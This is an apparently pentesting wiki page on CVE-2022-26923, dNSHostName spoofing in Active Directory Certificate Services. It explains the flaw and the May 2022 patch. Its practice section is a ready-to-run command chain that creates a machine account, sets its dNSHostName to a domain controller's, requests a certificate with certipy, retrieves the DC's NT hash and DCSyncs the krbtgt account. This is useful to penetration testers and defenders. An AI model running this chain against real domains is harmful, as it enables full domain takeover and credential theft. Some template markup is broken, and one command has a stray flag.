---
description: CVE-2022–26923
---

# dNSHostName spoofing

## Theory

{% hint style="warning" %}
_A security patch was released on **May 2022**, but there is still some case where the exploit still work_
{% endhint %}

By default, domain computers can enroll in the `Machine` certificate template which allow for client authentication. 
This means that the issued certificate can be used for authentication against the KDC using `PKINIT`. 

In order to enroll, the machine account need a dNSHostName attribute and this will be used as certificate subject.

By default, the dNSHostName of a machine account match with its sAMAccountName, but no validation process exist to make sure of it. More, it's possible to have several computer account with the same dNSHostName property.

An attackers could exploit that to impersonate any computer on the domain, domain controller included.

## Practice

### Machine Account

The ability to edit a machine account's `dNSHostName` and `servicePrincipaleName` attributes is a requirement to the attack chain.
The easiest way this can be achieved is by creating a computer account 
(e.g. by leveraging the [MachineAccountQuota](../domain-settings/machineaccountquota.md) domain-level attribute if it's greater than 0). 
The creator of the new machine account has enough privileges to edit its attributes. 
Alternatively, taking control over the owner/creator of a computer account should do the job.

`AD CS` should be installed on the domain and a certificate that allow client authentication and where machine account could enroll is also required. 
By default, the `Machine` template match with these requirements 

The attack can then be conducted as follows.

1. Clear the controlled machine account `servicePrincipalName` attribute of any value that points to its DNS Host Name (e.g. `host/machine.domain.local`, `RestrictedKrbHost/machine.domain.local`)
2. Change the controlled machine account `dNSHostName` to a Domain Controller's DNS Host Name (e.g. `DC01.domain.local`)
3. Request a certificate for the controlled machine account
4. Get access to the domain controller (i.e. [DCSync](../credentials/dumping/dcsync.md))

{% hint style="warning" %}
Some of the tools and features that allow exploitation of these vulnerabilities are still in development

* Impacket's editMachineAttribute: TODO

* {% endhint %}

% tabs %}
{% tab title="UNIX-like" %}
On UNIX-like systems, the steps mentioned above can be conducted with

* [krbelayx](https://github.com/dirkjanm/krbrelayx)'s (Python) addspn script for the manipulation of the computer's SPNs
* [Impacket](https://github.com/SecureAuthCorp/impacket)'s (Python) scripts (addcomputer, editMachineAttribute, secretsdump) for all the other operations

```bash
# 0. create a computer account
addcomputer.py -computer-name 'ControlledComputer$' -computer-pass 'ComputerPassword' -dc-host DC01 -domain-netbios domain 'domain.local/user1:complexpassword'

# 1. clear its SPNs
addspn.py --clear -t 'ControlledComputer$' -u 'domain\user' -p 'password' 'DomainController.domain.local'

# 2. rename the computer (computer -> DC)
editMachineAttribute.py -t 'ControlledComputer$' -attribute 'dNSHostName' -v 'DomainController.domain.local' -dc-ip 'DomainController.domain.local' 'domain.local'/'user':'password'

# 3. Request a certificate
certipy req 'domain.local/ControlledComputer$:ComputerPassword@DomainController.domain.local' -ca 'ca_name' -template 'certificate template'

# 4. Get the Domain Controller NT Hash
certipy auth -pfx certificate.pfx -dc-ip DomainController.domain.local

# 6. DCSync by presenting the service ticket
secretsdump.py -just-dc-user 'krbtgt' --hashes :HashNT -'DomainController$'@'DomainController.domain.local'
```
{% hint style="success" %}
When using [Impacket](https://github.com/SecureAuthCorp/impacket)'s addcomputer script for the creation of a computer account, the "SAMR" method is used by default (instead of the LDAPS one). At the time of writing (14th of May 2022), the SAMR method creates the account without SPNs, which allows to skip step #1.
{% endhint %}
{% endtab %}


![](<../../../.gitbook/assets/dnshostname_spoofing.png>)

## Patch

The vulnerability was patched as part of the **May 2022 Security Update**. Microsoft introduce a new Object ID (OID) in new certificates.
This is done by embeding the user's `objectSid` (SID) within the certificate. 

Certificate with the new `CT_FLAG_NO_SECURITY_EXTENSION` (`0x80000`) flag set in the `msPKI-Enrollment-Flag` will **not** embed the new Object.
These template are **still vulnerable** to this scenario.

More, the `Validated write to DNS host name` permission now only allows setting a `dNDHostName` attribute that match the `sAMAccountName` of the account.
However, with a `generic Write` permission over the computer account, it's still possible to create a duplicate `dNSHostName` value.

An attempt to exploit the vulnerability against a patched domain controller will return `KDC_ERR_CERTIFICATE_MISMATCH` during Kerberos authentication